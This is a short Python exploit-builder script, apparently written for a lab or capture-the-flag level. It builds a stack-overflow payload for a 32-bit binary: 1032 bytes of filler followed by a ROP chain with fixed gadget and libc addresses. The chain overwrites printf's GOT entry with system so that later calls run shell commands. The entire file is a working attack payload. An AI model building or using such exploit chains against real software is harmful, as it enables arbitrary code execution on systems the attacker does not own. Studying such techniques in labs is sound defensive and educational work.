#!/usr/bin/env python3
# build12 - the L12 exploit payload:
#   printf@GOT <- system@libc  (one 4-byte GOT write)
# The ROP (all fixed addresses, no stack addresses - env-independent):
#   1032 'A' filler       (unsafecode's buf[1032])
#   saved ebp             (readable scratch)
#   popal; cld; ret       (loads the registers from the stack)
#   6 filler dwords       (edi esi ebp esp(skip) ebx edx - all readable)
#   ecx = system@libc     (the VALUE written)
#   eax = printf@GOT      (the DESTINATION)
#   mov [eax],ecx; ret    (the write-what-where, libc+0x3caee)
#   park: safecode's loop (keeps main alive; the thread hits the patch)
# libc base 0xf7d6d000 (leaked live by the parking-loop trick: park with
# [ebp-0xc]=sleep@GOT and the loop prints its resolved value).
import struct
base = 0xf7d6d000
system = base + 0x53ce0        # system@libc
www = base + 0x3caee           # mov [eax],ecx; ret
F = 0x804c030                  # readable+writable scratch (bss, stdout ptr)
P  = b'A'*1032
P += struct.pack('<I', F)      # saved ebp
P += struct.pack('<I', 0x804931d)   # popal; cld; ret
P += struct.pack('<I', F)*6         # edi esi ebp esp(skip) ebx edx
P += struct.pack('<I', system)      # ecx = system@libc
P += struct.pack('<I', 0x804c004)   # eax = printf@GOT
P += struct.pack('<I', www)         # mov [eax],ecx; ret
P += struct.pack('<I', 0x8049260)   # park in safecode's loop
assert b'\x00' not in P
open('sy.bin','wb').write(P)
print("sy.bin", len(P))
